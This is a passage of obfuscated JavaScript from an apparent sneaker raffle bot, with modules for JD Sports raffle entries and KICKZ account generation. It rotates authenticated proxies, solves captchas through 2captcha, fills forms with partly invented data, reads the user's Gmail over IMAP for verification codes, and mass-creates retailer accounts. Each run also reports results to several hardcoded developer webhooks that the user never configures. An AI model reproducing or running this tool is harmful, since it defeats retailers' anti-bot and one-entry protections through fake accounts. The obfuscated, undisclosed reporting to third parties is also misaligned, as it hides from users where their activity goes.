                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Retrying\x20(' + _0x14d5a6 + '\x20/\x205)')), _0x54353b = _0x54353b - 0x1, _0x14d5a6 = _0x14d5a6 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x51ebaf, _0xb43e29, _0x3b8702) {
                var _0x15f738 = ![], _0x1935c4 = ![];
                if (_0x51f80a['captchaKey'] == '' || _0x51f80a['captchaKey'] == undefined)
                    return console['log'](_0x2c0b56['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51f80a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x279ad6 = 0x0; _0x279ad6 < _0xb43e29['length']; _0x279ad6++) {
                    if (_0x2f4069 != 'yes')
                        var _0x2f4069 = '', _0x462b07 = 0x0;
                    var _0x175db4, _0x5afd32 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0xb43e29[_0x279ad6]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xb43e29[_0x279ad6]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5ad930
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x51f80a['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x585daf
                            }
                        ]
                    }];
                    const _0x48c936 = { 'embeds': _0x5afd32 };
                    _0x5c316f(_0x51ebaf['name'] + '\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20/\x20' + _0xb43e29['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                    try {
                        await _0x3d5d40(_0xb43e29, _0x279ad6);
                    } catch {
                        _0x2f4069 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x5dc391 = await _0x539676(_0xb43e29[_0x279ad6], _0x51ebaf, 'dev', ![]), _0x12965e = await _0x539676(_0xb43e29[_0x279ad6], _0x51ebaf, 'pub', ![]);
                    const _0x4c464d = {
                        'succesDEVMSG': { 'embeds': [_0x5dc391] },
                        'succesPUBMSG': { 'embeds': [_0x12965e] }
                    };
                    if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                        try {
                            await _0x215470(_0x51f80a['webhook'], _0x4c464d['succesDEVMSG']);
                        } catch {
                        }
                    await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x4c464d['succesDEVMSG']), await _0xf987cc(0xc8);
                    try {
                        await _0x215470(_0x255a14, _0x4c464d['succesPUBMSG']);
                    } catch {
                    }
                    if (_0xb43e29[_0x279ad6]['Email'] == '' || _0xb43e29[_0x279ad6]['Url'] == '' || _0xb43e29[_0x279ad6]['FirstName'] == '' || _0xb43e29[_0x279ad6]['LastName'] == '') {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x51f80a['useRandomProxy'] = ![])
                        var _0x2514ae = _0x3b8702[_0x279ad6]['split'](':');
                    else
                        var _0x33b938 = Math['round'](Math['random']() * (_0x3b8702['length'] - 0x1)), _0x2514ae = _0x3b8702[_0x33b938]['split'](':');
                    var _0x10558c;
                    try {
                        _0x10558c = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2514ae[0x0] + ':' + _0x2514ae[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x10558c = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2514ae[0x0] + ':' + _0x2514ae[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x3fe531 = await _0x10558c['newPage']();
                        await _0x3fe531['authenticate']({
                            'username': '' + _0x2514ae[0x2],
                            'password': '' + _0x2514ae[0x3]
                        }), console['log'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3fe531['setRequestInterception'](!![]), _0x3fe531['on']('request', _0x4248d9 => {
                            _0x4248d9['resourceType']() === 'image' || _0x4248d9['resourceType']() === 'font' || _0x4248d9['resourceType']() === 'media' ? _0x4248d9['abort']() : _0x4248d9['continue']();
                        });
                        try {
                            await _0x3fe531['goto']('' + _0xb43e29[_0x279ad6]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x3fe531['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3fe531['type']('#comp_firstname', '' + _0xb43e29[_0x279ad6]['FirstName']), await _0x3fe531['waitForSelector']('#comp_lastname'), await _0x3fe531['type']('#comp_lastname', '' + _0xb43e29[_0x279ad6]['LastName']), await _0x3fe531['waitForSelector']('#comp_email'), await _0x3fe531['type']('#comp_email', '' + _0xb43e29[_0x279ad6]['Email']), await _0x3fe531['waitForSelector']('#comp_paypalemail'), await _0x3fe531['type']('#comp_paypalemail', '' + _0xb43e29[_0x279ad6]['Email']), await _0x3fe531['waitForSelector']('#comp_mobile_end'), await _0x3fe531['type']('#comp_mobile_end', '' + _0xb43e29[_0x279ad6]['Phone']), await _0x3fe531['waitForSelector']('#comp_dob'), await _0x3fe531['type']('#comp_dob', '08/09/1992'), console['log'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0xb43e29[_0x279ad6]['Size'] == 'RANDOM') {
                            const _0x497a5c = await _0x3fe531['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x38052a => {
                                return _0x38052a['map'](_0x306b99 => _0x306b99['value']);
                            });
                            var _0x4fe6bb = Math['round'](Math['random']() * (_0x497a5c['length'] - 0x2));
                            await _0x3fe531['select']('#shoesize', _0x497a5c[_0x4fe6bb + 0x1]), await _0xf987cc(0x3e8);
                        } else {
                            const _0x5e6d41 = await _0x3fe531['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5ee5cd => {
                                return _0x5ee5cd['map'](_0x2f4f2b => _0x2f4f2b['innerText']);
                            }), _0x37a009 = await _0x3fe531['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x47b0e5 => {
                                return _0x47b0e5['map'](_0x5ed697 => _0x5ed697['value']);
                            });
                            var _0x498efa = _0xb43e29[_0x279ad6]['Size'];
                            for (var _0x13adcf = 0x1; _0x13adcf < _0x37a009['length']; _0x13adcf++) {
                                var _0x4fb4b2 = _0x5e6d41[_0x13adcf]['split']('\x20')[0x0];
                                if (_0x4fb4b2 == _0x498efa) {
                                    await _0x3fe531['select']('#shoesize', _0x37a009[_0x13adcf]);
                                    break;
                                } else {
                                    if (_0x13adcf + 0x1 == _0x37a009['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x3fe531['waitForSelector']('#comp_address1'), await _0x3fe531['type']('#comp_address1', _0xb43e29[_0x279ad6]['Address1'] + '\x20' + _0xb43e29[_0x279ad6]['HouseNumber']), await _0x3fe531['waitForSelector']('#comp_address2'), await _0x3fe531['type']('#comp_address2', '' + _0xb43e29[_0x279ad6]['Address2']), await _0x3fe531['waitForSelector']('#comp_address2'), await _0x3fe531['type']('#comp_address3', '' + _0xb43e29[_0x279ad6]['City']), await _0x3fe531['waitForSelector']('#comp_postcode'), await _0x3fe531['type']('#comp_postcode', '' + _0xb43e29[_0x279ad6]['Zip']), console['log'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xf987cc(0x4b0), await _0x3fe531['click']('label#emailhold'), await _0xf987cc(0x5dc), await _0x3fe531['click']('#preauth_tandc_email\x20>\x20label'), await _0xf987cc(0x5dc), await _0x3fe531['click']('#submit');
                        try {
                            await _0x3fe531['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20' + _0x2c0b56['blue']('Awaiting\x20Paypal\x20Payment')), _0x10558c['on']('targetcreated', async _0x5be28d => {
                            if (_0x5be28d['type']() === 'page') {
                                const _0xa5cf0b = await _0x5be28d['page']();
                                async function _0x1bb6ac() {
                                    try {
                                        await _0x3fe531['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1935c4 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4b8c2a() {
                                    try {
                                        await _0x3fe531['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x15f738 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4b8c2a(), _0x1bb6ac(), await _0xf987cc(0x493e0);
                            }
                        });
                        async function _0x2f38c8() {
                            for (let _0x3bd185 = 0x0; _0x3bd185 < 0x12c; _0x3bd185++) {
                                if (_0x15f738 == !![]) {
                                    _0x2f4069 = 'no', _0x46ba09(_0xb43e29[_0x279ad6], _0x51ebaf), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                        try {
                                            await _0x215470(_0x51f80a['webhook'], _0x4c464d['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x4c464d['succesDEVMSG']), await _0xf987cc(0xc8);
                                    try {
                                        await _0x215470(_0x255a14, _0x4c464d['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x1935c4)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xf987cc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xf987cc(0xbb8), await _0x3fe531['click']('.zoid-outlet'), await _0xf987cc(0x7d0), await _0x2f38c8();
                    } catch (_0x88c96f) {
                        console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20' + _0x88c96f)), _0x175db4 = '' + _0x88c96f;
                        var _0x23935e = await _0x539676(_0xb43e29[_0x279ad6], _0x51ebaf, 'dev', !![], _0x175db4);
                        _0x4c464d['errorDEV'] = { 'embeds': [_0x23935e] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4c464d['errorDEV']), await _0x215470(_0x1dec8a, _0x4c464d['errorDEV']);
                    } finally {
                        _0x10558c && _0x10558c['close']();
                        if (_0x2f4069 == 'yes' && _0x462b07 != 0x5 && _0x175db4 != 'Size\x20Not\x20Found') {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51ebaf['name'] + ']\x20Task\x20' + (_0x279ad6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x462b07 + '\x20/\x205)')), _0x279ad6 = _0x279ad6 - 0x1, _0x462b07 = _0x462b07 + 0x1;
                            continue;
                        }
                        _0x2f4069 == 'yes' && _0x462b07 >= 0x5 && (_0x46ac44(afew[_0x279ad6], _0x51ebaf), _0x2f4069 = 'no', _0x462b07 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x36fddb, _0x11b976, _0x280f6d) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x45c9ed = 0x0; _0x45c9ed < _0x11b976['length']; _0x45c9ed++) {
                        const _0x24dd70 = 'https://www.kickz.com/login';
                        if (_0x5706ed != 'yes')
                            var _0x5706ed = '', _0x41053d = 0x0;
                        _0x5c316f(_0x36fddb['name'] + '\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20/\x20' + _0x11b976['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        try {
                            await _0x3d5d40(_0x11b976, _0x45c9ed);
                        } catch {
                            _0x5706ed = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x14d008 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5ad930
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51f80a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x585daf
                                }
                            ]
                        }];
                        const _0x371087 = { 'embeds': _0x14d008 };
                        var _0xbec3f7 = await _0x539676(_0x11b976[_0x45c9ed], _0x36fddb, 'acc', ![]);
                        const _0x2d6de0 = { 'succesDEVMSG': { 'embeds': [_0xbec3f7] } };
                        if (_0x11b976[_0x45c9ed]['Email'] == '' || _0x11b976[_0x45c9ed]['FirstName'] == '' || _0x11b976[_0x45c9ed]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x11b976[_0x45c9ed]['Password'] == '' && (_0x11b976[_0x45c9ed]['Password'] = 'JRaffles23!');
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0x4c45e6 = _0x280f6d[_0x45c9ed]['split'](':');
                        else
                            var _0x25b00b = Math['round'](Math['random']() * (_0x280f6d['length'] - 0x1)), _0x4c45e6 = _0x280f6d[_0x25b00b]['split'](':');
                        var _0x40dd84;
                        try {
                            _0x40dd84 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c45e6[0x0] + ':' + _0x4c45e6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x40dd84 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c45e6[0x0] + ':' + _0x4c45e6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x35899c = await _0x40dd84['newPage']();
                            await _0x35899c['authenticate']({
                                'username': '' + _0x4c45e6[0x2],
                                'password': '' + _0x4c45e6[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35899c['setRequestInterception'](!![]), _0x35899c['on']('request', _0x3a8bf0 => {
                                _0x3a8bf0['resourceType']() === 'image' || _0x3a8bf0['resourceType']() === 'font' || _0x3a8bf0['resourceType']() === 'media' ? _0x3a8bf0['abort']() : _0x3a8bf0['continue']();
                            }), await _0x35899c['goto'](_0x24dd70), await _0xf987cc(0xbb8), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x35899c['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x35899c['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x35899c['waitForSelector']('#button-register'), await _0xf987cc(0x7d0), await _0x35899c['evaluate'](() => {
                                const _0x4e89e2 = document['querySelector']('#button-register');
                                _0x4e89e2['click']();
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xf987cc(0x1388), await _0x35899c['waitForSelector']('#customer_salutation'), await _0x35899c['select']('#customer_salutation', 'mr'), await _0xf987cc(0x7d0), await _0x35899c['waitForSelector']('#customer_firstname'), await _0x35899c['type']('#customer_firstname', '' + _0x11b976[_0x45c9ed]['FirstName']), await _0xf987cc(0x352), await _0x35899c['waitForSelector']('#customer_lastname'), await _0x35899c['type']('#customer_lastname', '' + _0x11b976[_0x45c9ed]['LastName']), await _0xf987cc(0x352), await _0x35899c['type']('#email-input', '' + _0x11b976[_0x45c9ed]['Email']), await _0xf987cc(0x352), await _0x35899c['type']('#email-confirm-input', '' + _0x11b976[_0x45c9ed]['Email']), await _0xf987cc(0x352), await _0x35899c['type']('#register-password', '' + _0x11b976[_0x45c9ed]['Password']), await _0xf987cc(0x352), await _0x35899c['type']('#password-confirm', '' + _0x11b976[_0x45c9ed]['Password']), await _0xf987cc(0x352), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x35899c['click']('#consent'), await _0xf987cc(0x1f4);
                            const _0x1990e7 = await _0x35899c['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1990e7) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x35899c['click']('#buttonRegister');
                            try {
                                await _0x35899c['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x11b976[_0x45c9ed]['Email']), await _0xf987cc(0x4b0);
                            async function _0x30df2c() {
                                var _0x3e0da4, _0x48d349 = ![];
                                for (var _0x5e61e6 = 0x0; _0x5e61e6 < 0x18; _0x5e61e6++) {
                                    async function _0x496abd() {
                                        var _0x3474b7 = new _0x2a51ab({
                                            'user': _0x51f80a['masterMail'],
                                            'password': _0x51f80a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x467596(_0x4c82a7) {
                                            _0x3474b7['openBox']('INBOX', ![], _0x4c82a7);
                                        }
                                        _0x3474b7['once']('ready', function () {
                                            console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x467596(function (_0x53590d, _0x267a95) {
                                                console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x53590d)
                                                    throw _0x53590d;
                                                _0x3474b7['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2de5b8, _0x2e2e0d) {
                                                    if (!_0x2e2e0d || !_0x2e2e0d['length'])
                                                        console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3474b7['end']();
                                                    else {
                                                        var _0x2c4ed6 = _0x3474b7['seq']['fetch'](_0x2e2e0d, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2c4ed6['on']('message', function (_0xe4868a, _0x1822b5) {
                                                            var _0x5ba2b4 = '(#' + _0x1822b5 + ')\x20';
                                                            _0xe4868a['on']('body', function (_0x2649e3, _0x768506) {
                                                                _0xfebb(_0x2649e3, (_0x57d71c, _0x5b4da3) => {
                                                                    if (_0x5b4da3['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x56abcb = _0x5b4da3['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0xaefe8d = _0x56abcb[0x1]['split']('<')[0x0];
                                                                        _0x3e0da4 = _0xaefe8d;
                                                                    }
                                                                });
                                                            }), _0xe4868a['once']('end', function () {
                                                            });
                                                        }), _0x2c4ed6['once']('error', function (_0x4cebae) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2c4ed6['once']('end', function () {
                                                            _0x3474b7['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3474b7['once']('error', function (_0x5505ac) {
                                            console['log'](_0x2c0b56['red'](_0x5505ac['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x48d349 = !![];
                                        }), _0x3474b7['once']('end', async function () {
                                        }), _0x3474b7['connect']();
                                    }
                                    _0x496abd(), await _0xf987cc(0x1388);
                                    if (_0x3e0da4)
                                        return _0x3e0da4;
                                    if (_0x48d349)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5e61e6 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x30df2c(), _0xf987cc(0x320), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Verifying..'), await _0x35899c['type']('#verificationCode', code), await _0xf987cc(0x1f4), await _0x35899c['click']('#buttonVerify'), await _0xf987cc(0x190), await _0x35899c['click']('#buttonVerify'), await _0xf987cc(0x3e8);
                            try {
                                await _0x35899c['waitForSelector']('div.b-user_greeting'), _0x5706ed = 'no', console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Account\x20' + _0x11b976[_0x45c9ed]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3f8380['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x11b976[_0x45c9ed]['Email'] + ',' + _0x11b976[_0x45c9ed]['Password'] + ','), console['log'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Account\x20' + _0x11b976[_0x45c9ed]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x2d6de0['succesDEVMSG']);
                                } catch {
                                }
                                await _0x215470(_0x53db35, _0x2d6de0['succesDEVMSG']);
                            } catch {
                                _0x5706ed = 'no', console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4afcb0) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20' + _0x4afcb0)), _0x14d008[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x14d008[0x0]['description'] = '' + _0x4afcb0, await _0x215470(_0x1dec8a, _0x371087), _0x5706ed = 'yes';
                        } finally {
                            _0x40dd84 && _0x40dd84['close']();
                            if (_0x5706ed == 'yes' && _0x41053d != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x36fddb['name'] + ']\x20Task\x20' + (_0x45c9ed + 0x1) + '\x20:\x20Retrying\x20(' + _0x41053d + '\x20/\x205)')), _0x45c9ed = _0x45c9ed - 0x1, _0x41053d = _0x41053d + 0x1;
                                continue;
                            }
                            _0x5706ed == 'yes' && _0x41053d >= 0x5 && (_0x46ac44(_0x11b976[_0x45c9ed], _0x36fddb), _0x5706ed = 'no', _0x41053d = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x21af64, _0x3f5c27, _0x45fbb) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2e7c6b = 0x0; _0x2e7c6b < _0x3f5c27['length']; _0x2e7c6b++) {
                        var _0x2a5396;
                        if (_0x39ccad != 'yes')
                            var _0x39ccad = '', _0x17e619 = 0x0;
                        _0x5c316f(_0x21af64['name'] + '\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20/\x20' + _0x3f5c27['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        var _0x2c3e12 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5ad930
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x3f5c27[_0x2e7c6b]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x3f5c27[_0x2e7c6b]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51f80a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x585daf
                                }
                            ]
                        }], _0x484625 = await _0x539676(_0x3f5c27[_0x2e7c6b], _0x21af64, 'dev', ![]), _0x5c870f = await _0x539676(_0x3f5c27[_0x2e7c6b], _0x21af64, 'pub', ![]);
                        const _0x1b688a = {
                            'succesDEVMSG': { 'embeds': [_0x484625] },
                            'succesPUBMSG': { 'embeds': [_0x5c870f] }
                        };
                        try {
                            await _0x3d5d40(_0x3f5c27, _0x2e7c6b);
                        } catch {
                            _0x39ccad = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3f5c27[_0x2e7c6b]['Email'] == '' || _0x3f5c27[_0x2e7c6b]['Password'] == '' || _0x3f5c27[_0x2e7c6b]['FirstName'] == '' || _0x3f5c27[_0x2e7c6b]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Invalid\x20CSV');
